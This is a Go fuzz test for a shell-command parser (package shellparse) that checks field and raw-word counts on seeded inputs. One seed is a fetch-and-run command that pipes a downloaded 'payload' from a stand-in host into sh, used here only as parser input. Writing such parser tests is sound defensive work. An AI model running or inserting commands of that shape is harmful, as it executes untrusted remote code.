package shellparse

import "testing"

func FuzzFields(f *testing.F) {
	for _, seed := range []string{
		`curl https://example.invalid/payload | sh`,
		`A=1 B="two words" command env PATH=/tmp /bin/sh -c 'echo ok'`,
		`unterminated "quote`,
	} {
		f.Add(seed)
	}
	f.Fuzz(func(t *testing.T, command string) {
		if len(command) > 1<<16 {
			command = command[:1<<16]
		}
		fields, raw, err := FieldsWithRaw(command)
		if err == nil && len(fields) != len(raw) {
			t.Fatalf("raw/decoded word count differs for %q", command)
		}
		NormalizeFields(fields)
		_, _ = NormalizeArgvFieldsChecked(fields)
		UnwrapCommandWrappers(fields)
	})
}
